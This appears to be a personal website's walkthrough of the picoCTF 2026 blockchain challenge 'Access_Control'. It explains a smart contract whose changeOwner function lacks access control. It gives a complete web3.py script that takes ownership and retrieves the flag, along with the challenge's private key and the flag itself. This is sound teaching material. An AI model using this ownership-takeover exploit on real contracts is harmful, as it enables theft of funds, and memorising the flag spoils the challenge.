@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF Access_Control @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF Blockchain Guide</h1>
+        <p>here's how to solve Access_Control</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the Blockchain Guides</a>
+            <hr>
+            <h2>Access_Control</h2>
+            <pre>Name: Access_Control
+Description: We've created a simple contract to store a secret flag. But you currently are not the owner of the contract... Only the owner of the contract should be able to access it. We're sure we've made it secure this time. Contract: here The eth chain is at: Eth node address: lonely-island.picoctf.net:56743 More details can be found at here. NOTE: this server can take up to 5 minutes to start up. Please be patient.
+Author: OB
+Tags: Medium, Blockchain, picoCTF 2026
+Challenge from: picoCTF 2026
+Files: AccessControl.sol
+Hints:
+1. Wait, maybe you can be the owner?</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we have to take ownership of the contract that we're given, then that way we can retrieve the flag, so for that we'll have to skip to the solution part to look at the contract and the details webpage we are given.</p>
+            <h2>Solution</h2>
+            <p>So if we look at this contract, so far it's not secure at all! If we look over here to this function:</p>
+            <pre>function changeOwner(address _newOwner) public {
+  address oldOwner = owner;
+  owner = _newOwner;
+  emit OwnerChanged(oldOwner, _newOwner);
+}</pre>
+            <p>There isn't any access control on this function that has the power to change ownership, which is what the challenge asks us to do. So what's happening is that, anybody can enter and call changeOwner to make themselves the owner. The exploit idea will be to first put ourselves as owners, then call the solve function, so that we can use the getFlag function, first we'll need our address, so let's look at the details webpage:</p>
+            <pre>Welcome
+Exploit the access control vulnerability to take ownership and retrieve the flag.
+
+Contract Address:
+0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9
+
+Your Private Key:
+0x383454a0b1498099f0e41520328f92ae4b30ed3fada6730f46a6d7763211e7e7
+
+Your Address:
+0x52D64ea6aFAAc2CcA60e3Eb01A5F31dffd7d9697
+
+Gas Balance:
+5 ETH</pre>
+            <p>Perfect! Now we can start doing our code, first we'll initialize Web3 to see that we can connect. Then we'll enter the contract address and our private key. Then we'll enter our own contract, and finally we can use that to send transactions alongside our functions to get ownership, solve it from owner's address (us), and get the flag. So if we write all of that as a python script we get this:</p>
+            <pre>from web3 import Web3
+
+def send(tx):
+  tx.update({
+    "from": acc.address,
+    "nonce": w3.eth.get_transaction_count(acc.address),
+    "gas": 200000,
+    "maxFeePerGas": w3.to_wei("2", "gwei"),
+    "maxPriorityFeePerGas": w3.to_wei("1", "gwei"),
+    "chainId": w3.eth.chain_id
+  })
+
+  signed = w3.eth.account.sign_transaction(tx, privkey)
+  tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+  receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+
+  print(f"TX: {tx_hash.hex()}")
+  return receipt
+
+w3 = Web3(Web3.HTTPProvider("http://lonely-island.picoctf.net:56743"))
+print("is connec:", w3.is_connected())
+
+privkey = "0x383454a0b1498099f0e41520328f92ae4b30ed3fada6730f46a6d7763211e7e7"
+addr = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
+acc = w3.eth.account.from_key(privkey)
+print(f"our addres: {acc.address}")
+
+ABI = [{"inputs":[{"internalType":"address","name":"_newOwner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]
+
+contract = w3.eth.contract(address=Web3.to_checksum_address(addr), abi=ABI)
+
+print("\nbecome owner")
+send(contract.functions.changeOwner(acc.address).build_transaction())
+print("\nowner solves")
+send(contract.functions.solve().build_transaction({"from": acc.address}))
+print("\ntake flag")
+print(contract.functions.getFlag().call())</pre>
+            <a href="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/Access_Control/main.py" target="_blank">Download main.py</a>
+            <p>And if we run it, we should be able to get that flag:</p>
+            <pre>(venv) shukularuni@SHUKULAP:~/pctf26/blocain$ python3 access.py
+is connec: True
+our addres: 0xCB8ed2c0CDE3FA21193E0a27756ffA25B8F19d95
+
+become owner
+TX: 935139fbfb4b27bc57bc6ab546531854b0537332929efbc12aabf6d66e987a0f
+
+owner solves
+TX: ccf14bf0373ca37a6481a86215e781d8bb4b42e07adb77a718be928e2407f45a
+
+take flag
+picoCTF{i_c4n_b3_0wn3r_f5061ac6}</pre>
+            <p>There we go! That's the flag.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/723">https://play.picoctf.org/practice/challenge/723</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
